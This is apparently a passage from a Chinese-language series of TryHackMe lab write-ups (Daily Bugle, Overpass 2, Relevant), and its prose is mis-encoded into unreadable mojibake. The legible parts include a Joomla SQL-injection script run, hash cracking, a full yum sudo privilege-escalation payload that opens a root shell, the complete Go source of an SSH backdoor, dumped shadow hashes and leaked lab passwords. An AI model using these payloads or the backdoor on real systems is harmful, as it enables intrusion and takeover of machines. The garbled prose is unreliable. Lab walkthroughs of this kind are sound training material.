åˆ—è¡¨ï¼Œç”±äºè·¯å­æ–­äº†ï¼Œå¯ä»¥æƒ³åˆ°çœ‹çœ‹webç«™ç‚¹æ˜¯å¦æœ‰æ¼æ´ï¼Œæ‰«ç›®å½•å‘ç°å­˜åœ¨é‚®ä»¶ç³»ç»Ÿç™»å½•é¡µé¢ï¼Œäºæ˜¯å€Ÿç”¨ä¸Šè¿°å¯†ç åˆ—è¡¨ï¼ŒæˆåŠŸçˆ†ç ´å‡ºå¼ºå£ä»¤ã€‚ ç™»å½•è¿›å»ä¹‹åå°±æ˜¯æ‰¾ä¿¡æ¯æˆ–è€…æ¼æ´ç‚¹äº†ï¼Œç»“æœå‘ç°SMBæœåŠ¡é‡ç½®ä¹‹åçš„å¯†ç ï¼Œäºæ˜¯å¯ä»¥æˆåŠŸç™»å½•SMBæœåŠ¡äº†ï¼Œç™»å½•mileç”¨æˆ·ä¹‹ååˆå‘ç°ä¸€äº›ä¿¡æ¯æ³„éœ²ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªCMSç«™ç‚¹ï¼Œç»§ç»­æ‰«äºŒçº§ç›®å½•æ‰¾åˆ°åå°ç™»å½•åœ°å€ï¼Œæ¥ç€å‘ç°å­˜åœ¨Cuppa CMSè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œäºæ˜¯åŒ…å«shellæ–‡ä»¶ï¼Œåå¼¹å¾—åˆ°shellï¼Œæ¥ç€ç”¨è‡ªå¸¦çš„Pythonå»ºç«‹ä¸€ä¸ªç¨³å®šshellï¼Œæ¥ç€å°è¯•ææƒï¼Œå‘ç°å¸¸è§„æ€è·¯æ— æœï¼Œçœ‹åˆ°è®¡åˆ’ä»»åŠ¡å¯ç–‘ï¼Œå‘ç°å­˜åœ¨taré€šé…ç¬¦æ¼æ´ææƒï¼Œå‡­å€Ÿå‚æ•° é…åˆä½¿ç”¨æœ€ç»ˆæ‹¿åˆ°root priv 0x09 Daily Bugle é€šè¿‡ SQLi å…¥ä¾µ Joomla CMS å¸æˆ·ï¼Œç»ƒä¹ ç ´è§£å“ˆå¸Œå€¼å¹¶åˆ©ç”¨ yum æå‡æ‚¨çš„æƒé™ã€‚ åˆå§‹è®¿é—® å¸¸è§„nmapæ‰«æ nmap -T4 -sC -sV -p- 10.10.35.116 ä¸Šå›¾å¯ä»¥çœ‹åˆ°http-generatorï¼ˆè¿™ä¸ªå¯ä»¥è¯´æ˜¯è¯†åˆ«å½“å‰webæœåŠ¡å™¨æŒ‡çº¹ä¿¡æ¯ï¼‰å†™ç€joomlaï¼Œé‚£æˆ‘ä»¬å°è¯•æœä¸€ä¸‹ç›¸å…³åˆ©ç”¨ search joomla use scanner/http/joomla_version run å¯ä»¥çœ‹åˆ°å¾—åˆ°ç‰ˆæœ¬ç­‰è¯¦ç»†ä¿¡æ¯ï¼Œè¿™é‡Œæ²¡æƒ³åˆ°å»ç½‘ç»œæ¼«æ¸¸ï¼Œæœå¯»ç›¸å…³æ¼æ´ï¼Œæ ¹æ®æç¤ºå»æœç´¢çš„ ä¸€ä¸ªæ˜¯åœ¨exploitæ¼æ´åº“å¯ä»¥çœ‹åˆ°åˆ©ç”¨æ–¹æ³•ï¼šè¿™ä¸ªç”¨çš„æ˜¯sqlmapï¼Œä¸”éœ€è¦è®¾ç½®å¾ˆå¤šå‚æ•°ã€‚ ä½†å¦‚æœç»§ç»­æœç´¢å°±ä¼šå‘ç°å¦‚ä¸‹é¡¹ç›®ï¼Œå…¶ä¸­åŒ…å«ä¼—å¤šCMSçš„åˆ©ç”¨è„šæœ¬ï¼Œæˆ‘ä»¬ç›´æ¥é‡‡ç”¨è¿™ä¸ª https://github.com/XiphosResearch/exploits SQLæ³¨å…¥ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œæ˜¯è„šæœ¬ç”¨æ³•ï¼Œå¯ä»¥çœ‹åˆ°å®ƒéœ€è¦ä½ å†™å‡ºç›®æ ‡IPï¼Œå¹¶ä¸”ä¼šä¸ºä½ dumpå‡ºç”¨æˆ·å’Œsessionè¡¨ python2 joomblah.py http://10.10.35.116/ å¯ä»¥çœ‹åˆ°è¿™é‡Œå¾—åˆ°çš„è¡¨æ˜ï¼Œå…¶ä¸­æ‰¾åˆ°äº†ä¸€äº›ç”¨æˆ·åï¼Œè¿™é‡Œæˆ‘å¯¹äºè¿™ä¸ªçˆ†å‡ºæ¥çš„æ•°æ®ç†è§£é”™äº†ï¼Œæˆ‘ä»¥ä¸ºuserè¿™é‡Œä»£è¡¨å…¨éƒ½æ˜¯ç”¨æˆ·åä¹‹ç±»çš„ï¼Œä½†å½“æˆ‘çœ‹åˆ°wpçš„sqlmapç»“æœï¼Œæˆ‘æ‚Ÿäº† è¿™å®Œå…¨å°±æ˜¯ä¸€ä¸ªè¡¨ç»“æ„è€Œå·²ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çˆ†ç ´åé¢çš„hashå¯†ç ä¸ºæ˜æ–‡å³å¯ï¼ˆæ ¹æ®æç¤ºï¼Œä½¿ç”¨johnï¼‰ johnæš´åŠ›ç ´è§£ $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm//å†™åˆ°æ–‡ä»¶ä¸­å³å¯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt æˆåŠŸå¾—åˆ°å¯†ç  ç»§ç»­ç½‘ç»œæ¼«æ¸¸ï¼Œæœå¯»è·å–åå°ä¹‹åå¦‚ä½•getshellçš„æ€è·¯ï¼ŒæˆåŠŸæ‰¾åˆ° ä¸Šå›¾ä½ç½®ï¼Œå¯ä»¥ç…§ç€ç®­å¤´æ‰¾åˆ°ï¼Œæ¥ç€åˆ©ç”¨msfç”Ÿæˆphp shellï¼Œæ›¿æ¢ä¸Šè¿°æ–‡ä»¶å†…å®¹ msfè·å¾—shell ä¹‹åè®¿é—®æ–‡ä»¶æ‰€åœ¨è·¯å¾„å³å¯ï¼ŒåŒæ—¶msfå¼€å¯ç›‘å¬ï¼ˆè®°å¾—è®¾ç½®çš„payloadç±»å‹ä¸€è‡´ï¼‰ æ‹¿åˆ°ä¹‹åå‘ç°å½“å‰ç”¨æˆ·æ˜¯apacheï¼Œrootå’Œhomeçš„ç”¨æˆ·éƒ½æ— æƒè®¿é—®ï¼Œææƒä¹Ÿæ‰¾ä¸åˆ°ï¼ˆè¿™é‡Œæˆ‘ä¹Ÿæ˜¯è¯¯åŒºï¼Œä»¥ä¸ºææƒå¿…é¡»æ‰¾ä¸€äº›é…ç½®çš„é”™è¯¯ï¼Œä½†wpå‘Šè¯‰æˆ‘ï¼Œå¯ä»¥æ‰¾ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œå¯èƒ½ä¼šæ³„éœ²ç”¨æˆ·å¯†ç ï¼‰ åˆ‡æ¢ç”¨æˆ·ææƒ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œçš„phpæ–‡ä»¶ï¼Œåå­—å¯ç–‘ï¼Œè®¿é—®å‘ç°æœ‰æ•°æ®åº“é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«å¯†ç ï¼Œæ‰€ä»¥å°è¯•è¯¥å¯†ç åŒºåˆ‡æ¢ç”¨æˆ·ä¹‹ç±»çš„ su jjameson//è¾“å…¥å¯†ç å³å¯ æœ€åæ‹¿åˆ°flagï¼Œæ¥ä¸‹æ¥çœ‹root sudo ææƒ TF=$(mktemp -d) cat &gt;$TF/x&lt;&lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat &gt;$TF/y.conf&lt;&lt;EOF [main] enabled=1 EOF cat &gt;$TF/y.py&lt;&lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version='2.1' def init_hook(conduit): os.execl('/bin/sh','/bin/sh') EOF sudo yum -c $TF/x --enableplugin=y å¯ä»¥çœ‹åˆ°æˆåŠŸææƒ æ€»ç»“ è¿™é“é¢˜å°±æ˜¯é webç«™ç‚¹å±‚å±‚æ·±å…¥ï¼Œå…ˆæ˜¯nmapæ‰«æçš„æ—¶å€™ï¼Œæ‰«å‡ºäº†webç«™ç‚¹ç›¸å…³æŒ‡çº¹ä¿¡æ¯ï¼šjoomlaï¼Œç›´æ¥ç½‘ä¸Šæ‰¾ç›¸å…³exploit å‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼Œåˆ©ç”¨ç›¸å…³è„šæœ¬å¾—åˆ°åå°è´¦æˆ·å¯†ç ï¼Œç™»å½•è¿›å»ï¼Œå°±æ˜¯æ‰¾ç›¸å…³åŠŸèƒ½RCEï¼Œå¹¸è¿çš„æ˜¯åœ¨è®¾ç½®æ¨¡ç‰ˆæ–‡ä»¶çš„åœ°æ–¹å‘ç°èƒ½è‡ªå®šä¹‰PHPæ–‡ä»¶å†…å®¹ï¼Œç›´æ¥æ³¨å…¥msfç”Ÿæˆçš„phpåå‘shellï¼Œè®¿é—®è¿è¡Œï¼Œå¾—åˆ°shellã€‚ä¹‹åå°±æ˜¯ææƒï¼Œè¿™é‡Œæ˜¯sudoææƒï¼Œä½†åœ¨ä½¿ç”¨è¿™ä¸ªå‰ææ˜¯ï¼Œåœ¨webç›¸å…³é…ç½®æ–‡ä»¶æ‰¾åˆ°äº†ç”¨æˆ·çš„å¯†ç ä¿¡æ¯ï¼Œå¾—ä»¥su åˆ‡æ¢ç”¨æˆ·ï¼ˆå› ä¸ºåœ¨æ­¤ä¹‹å‰æ˜¯apacheèº«ä»½ï¼‰ä¹‹åsudo -lå‘ç°yumï¼Œæ‰¾åˆ°yumçš„sudoææƒæ–¹å¼ï¼Œæ‹¿åˆ°rootèº«ä»½ å‚è€ƒæ–‡ç«  Daily Bugle --tryhackme.com Daily Bugle DAILY BUGLE â€“ TRYHACKME WRITE-UP 0x10 Overpass 2 - Hacked ç«‹äº¤æ¡¥è¢«é»‘äº†ï¼ä½ èƒ½åˆ†ææ”»å‡»è€…çš„è¡Œä¸ºå¹¶å…¥ä¾µå—ï¼Ÿ å–è¯-åˆ†æ PCAP ç«‹äº¤æ¡¥è¢«é»‘äº†ï¼SOC å›¢é˜Ÿï¼ˆParadoxï¼Œæ­å–œæ™‹å‡ï¼‰åœ¨æ·±å¤œå€¼ç­æ—¶æ³¨æ„åˆ°å¯ç–‘æ´»åŠ¨ï¼ŒåŒæ—¶æŸ¥çœ‹ shibesï¼Œå¹¶è®¾æ³•åœ¨æ”»å‡»å‘ç”Ÿæ—¶æ•è·æ•°æ®åŒ…ã€‚ä½ èƒ½å¼„æ¸…æ¥šæ”»å‡»è€…æ˜¯å¦‚ä½•è¿›å…¥çš„ï¼Œå¹¶å…¥ä¾µOverpassçš„ç”Ÿäº§æœåŠ¡å™¨å—ï¼Ÿ æ³¨æ„ï¼šè™½ç„¶è¿™ä¸ªæˆ¿é—´æ˜¯ä¸€ä¸ªæ¼”ç»ƒï¼Œä½†å®ƒéœ€è¦ç†Ÿæ‚‰å·¥å…·å’Œ Linuxã€‚æˆ‘å»ºè®®è‡³å°‘å­¦ä¹ åŸºæœ¬çš„ Wireshark å¹¶å®Œæˆ Linux åŸºç¡€çŸ¥è¯†ã€‚ PCAP æ–‡ä»¶çš„ md5sumï¼š11c3b2e9221865580295bc662c35c6dc ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œä¸Šä¼ æ–‡ä»¶çš„urlä¸º/development/ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°æ”»å‡»è€…ä½¿ç”¨çš„payload ä¸Šå›¾å¯ä»¥çœ‹åˆ°æ”»å‡»è€…è·å–åˆ°äº†å¯†ç ï¼Œä¸‹å›¾å¯ä»¥çœ‹åˆ°æ”»å‡»è€…å»ºç«‹æŒä¹…æ€§çš„æ–¹æ³• james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7::: paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7::: szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7::: bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7::: muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7::: ä¸Šé¢æ˜¯æ”»å‡»è€…è·å–çš„ç›¸å…³å¯†ç ä¿¡æ¯ï¼ˆè½¬å‚¨å½±å­æ–‡ä»¶æ‰€å¾—ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬johnçˆ†ç ´ä¸€ä¸‹ï¼Œå‘ç°æœ‰å››ä¸ªå¯ä»¥çˆ†ç ´å‡ºæ¥ ç ”ç©¶-åˆ†æä»£ç  ç°åœ¨æ‚¨å·²ç»æ‰¾åˆ°äº†åé—¨çš„ä»£ç ï¼Œæ˜¯æ—¶å€™åˆ†æå®ƒäº†ã€‚ githubæœç´¢å³å¯ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°é»˜è®¤å¯†ç å’Œç¡¬ç¼–ç ç› package main import ( \"crypto/sha512\" \"fmt\" \"io\" \"io/ioutil\" \"log\" \"net\" \"os/exec\" \"github.com/creack/pty\" \"github.com/gliderlabs/ssh\" \"github.com/integrii/flaggy\" gossh \"golang.org/x/crypto/ssh\" \"golang.org/x/crypto/ssh/terminal\" ) var hash string = \"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\" func main() { var ( lport uint = 2222 lhost net.IP = net.ParseIP(\"0.0.0.0\") keyPath string = \"id_rsa\" fingerprint string = \"OpenSSH_8.2p1 Debian-4\" ) flaggy.UInt(&amp;lport, \"p\", \"port\", \"Local port to listen for SSH on\") flaggy.IP(&amp;lhost, \"i\", \"interface\", \"IP address for the interface to listen on\") flaggy.String(&amp;keyPath, \"k\", \"key\", \"Path to private key for SSH server\") flaggy.String(&amp;fingerprint, \"f\", \"fingerprint\", \"SSH Fingerprint, excluding the SSH-2.0- prefix\") flaggy.String(&amp;hash, \"a\", \"hash\", \"Hash for backdoor\") flaggy.Parse() log.SetPrefix(\"SSH - \") privKeyBytes, err := ioutil.ReadFile(keyPath) if err != nil { log.Panicln(\"Error reading privkey:\\t\", err.Error()) } privateKey, err := gossh.ParsePrivateKey(privKeyBytes) if err != nil { log.Panicln(\"Error parsing privkey:\\t\", err.Error()) } server := &amp;ssh.Server{ Addr: fmt.Sprintf(\"%s:%v\", lhost.String(), lport), Handler: sshterminal, Version: fingerprint, PasswordHandler: passwordHandler, } server.AddHostKey(privateKey) log.Println(\"Started SSH backdoor on\", server.Addr) log.Fatal(server.ListenAndServe()) } func verifyPass(hash, salt, password string) bool { resultHash := hashPassword(password, salt) return resultHash == hash } func hashPassword(password string, salt string) string { hash := sha512.Sum512([]byte(password + salt)) return fmt.Sprintf(\"%x\", hash) } func sshHandler(s ssh.Session) { command := s.RawCommand() if command != \"\" { s.Write(runCommand(command)) return } term := terminal.NewTerminal(s, \"$ \") for { command, _ = term.ReadLine() if command == \"exit\" { return } term.Write(runCommand(command)) } } func sshterminal(s ssh.Session) { cmd := exec.Command(\"/bin/bash\", \"-i\") ptyReq, _, isPty := s.Pty() if isPty { cmd.Env = append(cmd.Env, fmt.Sprintf(\"TERM=%s\", ptyReq.Term)) f, err := pty.Start(cmd) if err != nil { panic(err) } go func() { io.Copy(f, s) // stdin }() io.Copy(s, f) // stdout cmd.Wait() } else { io.WriteString(s, \"No PTY requested. \") s.Exit(1) } } func runCommand(cmd string) []byte { result := exec.Command(\"/bin/bash\", \"-c\", cmd) response, _ := result.CombinedOutput() return response } func passwordHandler(_ ssh.Context, password string) bool { return verifyPass(hash, \"1c362db832f3f864c8c2fe05f2002a05\", password) } ä¸Šå›¾æ˜¯æ”»å‡»è€…ä½¿ç”¨çš„hash 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed å¦‚ä¸Šå›¾ï¼Œè¯†åˆ«å‡ºè¯¥hashåŠ å¯†çš„å¯èƒ½ç®—æ³•ï¼Œè¿™é‡Œå°è¯•sha512ï¼Œå¯¹åº”çš„åˆ° hashcatçœ‹ä¸€ä¸‹å¯¹åº”çš„ç¼–å· æ˜¾ç„¶æ ¹æ®ä¸Šè¿°goåé—¨æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯1710çš„æ ¼å¼ 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 å¯ä»¥çœ‹åˆ°è¿™é‡ŒæˆåŠŸç ´è§£å‡ºç›ï¼šnovember16 æ”»å‡»-é‡æ–°è¿›å…¥ ç°åœ¨äº‹ä»¶å·²ç»è°ƒæŸ¥å®Œæ¯•ï¼ŒParadox éœ€è¦æœ‰äººå†æ¬¡æ§åˆ¶ Overpass ç”Ÿäº§æœåŠ¡å™¨ã€‚åŒ…è£…ç›’ä¸Šæœ‰æ ‡å¿—ï¼ŒOverpassä¸èƒ½å› ä¸ºæ ¼å¼åŒ–æœåŠ¡å™¨è€Œå¤±å»ï¼ ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.115.228 -p 2222 æ¥ä¸‹æ¥å°±æ˜¯ææƒï¼Œsudo -læ²¡æœ‰ç»“æœï¼Œå°è¯•suidï¼Œå¦‚ä¸‹å›¾ï¼Œå‘ç°.suid_bashå¯ç–‘æ–‡ä»¶ fileå‘½ä»¤æŸ¥çœ‹ï¼Œå¦‚ä¸‹å›¾ï¼šä¸ºä¸€ä¸ª64ä½çš„ELFå¯æ‰§è¡Œæ–‡ä»¶ã€‚ æˆ‘ä»¬å°è¯•æ‰§è¡Œï¼Œè¿™é‡Œéœ€è¦æ³¨æ„è™½ç„¶è¯¥æ–‡ä»¶è®¾ç½®äº†suidæƒé™ï¼Œä½†éœ€è¦ä½ æ·»åŠ -pé€‰é¡¹æ‰å¯ä»¥ä»¥rootèº«ä»½è¿è¡Œï¼ŒåŸå› å¦‚ä¸‹ æ€»ç»“ è¿™ç¯‡æ–‡ç« ï¼Œè®©æˆ‘ä»¬å­¦ä¹ çš„å–è¯åˆ†æï¼Œå¾—åˆ°æµé‡åŒ…ï¼Œåœ¨è¿½è¸ªTCPå’ŒHTTPæµçš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¾—çŸ¥äº†æ”»å‡»è€…æ˜¯å¦‚ä½•æ”»å‡»è¯¥ç«™ç‚¹ï¼Œå¹¶æ³¨å…¥äº†åé—¨ã€‚ä¹‹åæˆ‘ä»¬é‡æ–°æ”»å‡»çš„æ—¶å€™ï¼Œç›´æ¥åˆ©ç”¨è¯¥åé—¨ï¼Œsshç™»å½•ä¸Šå»ï¼Œèº«ä»½ä¸ºJamesï¼Œä¹‹åä¾æ—§æ˜¯ææƒï¼Œsudo -læ— æœï¼Œå°è¯•suidææƒï¼Œæ‰¾åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å­˜åœ¨suidæƒé™ï¼Œæ‰§è¡Œçš„æ—¶å€™æ·»åŠ -på¾—åˆ°rootèº«ä»½ã€‚ å‚è€ƒæ–‡ç«  Writeup for TryHackMe Room â€˜Overpass 2 - Hackedâ€™ Forensics - Analyse the PCAP 0x11 Relevant æ¸—é€æµ‹è¯•è¦æ±‚ æ‚¨å·²è¢«åˆ†é…åˆ°ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œè¯¥å®¢æˆ·ç«¯å¸Œæœ›åœ¨ 7 å¤©å†…å‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒä¸­çš„ç¯å¢ƒä¸Šæ‰§è¡Œæ¸—é€æµ‹è¯•ã€‚ Scope of Work å·¥ä½œèŒƒå›´ å®¢æˆ·è¦æ±‚å·¥ç¨‹å¸ˆå¯¹æä¾›çš„è™šæ‹Ÿç¯å¢ƒè¿›è¡Œè¯„ä¼°ã€‚å®¢æˆ·è¦æ±‚æä¾›æœ‰å…³è¯„ä¼°çš„æœ€å°‘ä¿¡æ¯ï¼Œå¸Œæœ›ä»æ¶æ„è¡Œä¸ºè€…çš„è§’åº¦è¿›è¡Œå‚ä¸ï¼ˆé»‘åŒ£å­æ¸—é€æµ‹è¯•ï¼‰ã€‚ å®¢æˆ·ç«¯è¦æ±‚æ‚¨ä¿æŠ¤ä¸¤ä¸ªæ ‡å¿—ï¼ˆæœªæä¾›ä½ç½®ï¼‰ä½œä¸ºåˆ©ç”¨è¯æ˜ï¼š User.txt Root.txt æ­¤å¤–ï¼Œå®¢æˆ·è¿˜æä¾›äº†ä»¥ä¸‹èŒƒå›´æ´¥è´´ï¼š æ­¤æœåŠ¡å…è®¸ä½¿ç”¨ä»»ä½•å·¥å…·æˆ–æŠ€æœ¯ï¼Œä½†æˆ‘ä»¬è¦æ±‚æ‚¨å…ˆå°è¯•æ‰‹åŠ¨åˆ©ç”¨ æŸ¥æ‰¾å¹¶è®°å½•å‘ç°çš„æ‰€æœ‰æ¼æ´ å°†å‘ç°çš„æ ‡å¿—æäº¤åˆ°ä»ªè¡¨æ¿ åªæœ‰åˆ†é…ç»™è®¡ç®—æœºçš„ IP åœ°å€åœ¨èŒƒå›´å†… æŸ¥æ‰¾å¹¶æŠ¥å‘Šæ‰€æœ‰æ¼æ´ï¼ˆæ˜¯çš„ï¼Œæœ‰å¤šä¸ªæ ¹è·¯å¾„ï¼‰ ï¼ˆè§’è‰²æ‰®æ¼”å…³é—­ï¼‰ æˆ‘é¼“åŠ±æ‚¨å°†æ­¤æŒ‘æˆ˜è§†ä¸ºå®é™…çš„æ¸—é€æµ‹è¯•ã€‚è€ƒè™‘ç¼–å†™ä¸€ä»½æŠ¥å‘Šï¼ŒåŒ…æ‹¬æ‰§è¡Œæ‘˜è¦ã€æ¼æ´å’Œæ¼æ´åˆ©ç”¨è¯„ä¼°ä»¥åŠè¡¥æ•‘å»ºè®®ï¼Œå› ä¸ºè¿™å°†æœ‰åˆ©äºæ‚¨å‡†å¤‡ eLearnSecurity è®¤è¯ä¸“ä¸šæ¸—é€æµ‹è¯•äººå‘˜æˆ–è¯¥é¢†åŸŸæ¸—é€æµ‹è¯•äººå‘˜çš„èŒä¸šç”Ÿæ¶¯ã€‚ æ³¨æ„ - è¿™ä¸ªæˆ¿é—´é‡Œæ²¡æœ‰ä»»ä½•ä¸œè¥¿éœ€è¦Metasploit è®¡ç®—æœºæœ€å¤šå¯èƒ½éœ€è¦ 5 åˆ†é’Ÿæ‰èƒ½å¯åŠ¨æ‰€æœ‰æœåŠ¡ã€‚ *æ­¤æˆ¿é—´ä¸æ¥å—ä¹¦é¢è®°å½•ã€‚ å¸¸è§„æ‰«æ nmap -T5 -p- 10.10.127.72 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 10:59 CST Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.52% done Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.97% done Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 46.66% done; ETC: 11:05 (0:03:15 remaining) Stats: 0:04:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 81.33% done; ETC: 11:05 (0:01:02 remaining) Nmap scan report for 10.10.127.72 Host is up (0.20s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49663/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 324.81 seconds å¯ä»¥çœ‹åˆ°139ä¸445ç«¯å£å¼€å¯ï¼Œå°è¯•æšä¸¾SMB æ¥ç€è¿æ¥ç›®æ ‡nt4wrksvå…±äº«SMBæœåŠ¡ å¹¸è¿çš„æ— å¯†ç å³å¯è®¿é—®ï¼Œçœ‹åˆ°å½“å‰ç›®å½•å«æœ‰å¯†ç æ–‡ä»¶ï¼Œä¸‹è½½æŸ¥çœ‹ Bob - !P@$$W0rD!123 Bill - Juw4nnaM4n420696969!$$$ æ¥ç€å¯¹è¿™äº›å­˜æ´»ç«¯å£è¿›è¡Œè¯¦ç»†æ‰«æ nmap -p 80,135,139,445,3389,49663,49667,49669 10.10.127.72 -sC -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 11:38 CST Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 98.38% done; ETC: 11:39 (0:00:00 remaining) Nmap scan report for 10.10.127.72 Host is up (0.20s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-04-29T03:39:53+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=Relevant | Not valid before: 2024-04-28T02:58:49 |_Not valid after: 2024-10-28T02:58:49 | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2024-04-29T03:39:14+00:00 49663/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2024-04-29T03:39:14 |_ start_date: 2024-04-29T02:59:08 | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-04-28T20:39:18-07:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.66 seconds Webç«™ç‚¹æ¢æµ‹ å°è¯•æ‰«webç«™ç‚¹ç›®å½•ï¼Œåœ¨49663ç«¯å£ä¸‹æ‰«åˆ°äº†éšè—ç›®å½• æ„Ÿè§‰åˆæ˜¯æˆ‘æƒ³ä¸åˆ°çš„æ€è·¯ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°éšè—ç›®å½•ä¸æˆ‘ä»¬SMBå…±äº«ç›®å½•åç§°ç›¸åŒï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹ å¯ä»¥çœ‹åˆ°ç›´æ¥è®¿é—®å°±èƒ½å¾—åˆ°æ–‡ä»¶å†…å®¹ï¼Œè¯´æ˜è¿™ä¸ªç”¨æˆ·çš„SMBå…±äº«æ‰˜ç®¡åˆ°äº†webç«™ç‚¹äº†ï¼Œè¿™é‡Œæˆ‘çœ‹æœ‰çš„å¸ˆå‚…æ˜¯å…ˆå°è¯•nmapç»§ç»­æ‰«æçœ‹æ˜¯å¦å­˜åœ¨ä¸€äº›è„†å¼±çš„æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼Œä¹Ÿæœ‰çš„ç›´æ¥å°±çŸ¥é“å¯ä»¥ä¸Šä¼ åå‘shellã€‚ SMBä¸Šä¼ åå‘shell è¿™é‡Œæˆ‘ä¹Ÿå…ˆè·Ÿç€å¸ˆå‚…ä»¬èµ°ï¼Œç­‰æœ€åå›è¿‡å¤´æ¥åœ¨æ€è€ƒï¼Œé¦–å…ˆmsfç”Ÿæˆä¸€ä¸ªåå‘shellï¼Œç”±äºè¿™æ˜¯IISæœåŠ¡å™¨ï¼Œå› æ­¤è‚¯å®šæ˜¯ç”Ÿæˆaspxæ–‡ä»¶ æ¥ç€è¿æ¥SMBå…±äº«ï¼Œç„¶åputä¸Šä¼ shellï¼Œä¹‹åæµè§ˆå™¨æˆ–è€…curlè®¿é—® dir /s /b c:\\ | find \"user.txt\" dir /s /b c:\\ | find \"root.txt\" #Windowså‘½ä»¤è¡Œ-- æŒ‰æ–‡ä»¶åæŸ¥æ‰¾ç›¸å…³è·¯å¾„ dir /s /b 